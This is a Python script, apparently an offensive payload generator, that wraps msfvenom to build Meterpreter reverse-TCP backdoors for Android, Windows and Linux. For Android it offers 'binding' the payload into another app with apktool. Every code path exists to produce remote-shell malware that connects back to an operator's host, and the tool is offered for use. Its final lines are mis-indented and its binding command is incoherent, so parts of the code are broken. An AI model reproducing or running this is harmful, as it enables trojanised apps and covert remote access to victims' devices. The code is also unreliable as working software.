import os
import platform
import logging
import subprocess

# Configure the logging system
logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")

def get_bind_file_path():
    if platform.system() == "Windows":
        import tkinter as tk
        from tkinter import filedialog

        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename()
        root.destroy()
    elif platform.system() == "Linux":
        file_path = input("Enter the path to the file you want to bind (Linux): ")
    else:
        file_path = input("Enter the path to the file you want to bind (Other platforms): ")

    return file_path

def execute_command(command, verbose=False):
    try:
        if verbose:
            print(f"Executing command: {command}")
        result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        error_message = f"Error executing command: {e.stderr}"
        logging.error(error_message)
        return error_message

def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, custom_output_file=None, verbose=False):
    if not ip or not port:
        error_message = "IP address and port are required."
        logging.error(error_message)
        return error_message

    if payload_type == "android":
        if android_api_level:
            output_file = custom_output_file if custom_output_file else "payload.apk"
            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} -t apk -a dalvik --platform android -A {android_api_level}"
        else:
            error_message = "Android API level is required for Android payload."
            logging.error(error_message)
            return error_message
    elif payload_type == "windows":
        output_file = custom_output_file if custom_output_file else "payload.exe"
        payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o {output_file}"
    elif payload_type == "linux":
        output_file = custom_output_file if custom_output_file else "payload.elf"
        payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o {output_file}"
    else:
        error_message = "Unsupported payload type."
        logging.error(error_message)
        return error_message

    if bind:
        if not bind_file:
            bind_file = get_bind_file_path()

        if payload_type == "android":
            output_file = "bind_payload.apk"
            binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
            bind_output = execute_command(binding_command, verbose)
            if "Exception" in bind_output:
                error_message = f"Binding failed: {bind_output}"
                logging.error(error_message)
                return error_message
        elif payload_type == "windows":
            error_message = "Binding is not supported for Windows payloads."
            logging.error(error_message)
            return error_message
        elif payload_type == "linux":
            error_message = "Binding is not supported for Linux payloads."
            logging.error(error_message)
            return error_message
        else:
            error_message = "Unsupported payload type."
            logging.error(error_message)
            return error_message

    payload_output = execute_command(payload_command, verbose)
    if "Exception" in payload_output:
        error_message = f"Payload generation failed: {payload_output}"
        logging.error(error_message)
        return error_message

    success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
    logging.info(success_message)
    return success_message

if __name__ == "__main__":
    verbose = True

    ip = input("Enter your IP address: ")
    port = input("Enter the port: ")
    payload_type = input("Enter payload type (android/windows/linux): ").lower()
    android_api_level = input("Enter Android API level (e.g., 33 for Android 13, or leave empty for other platforms): ")

    bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
    bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()
    
result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)

    print(result)
                                                                                                                                
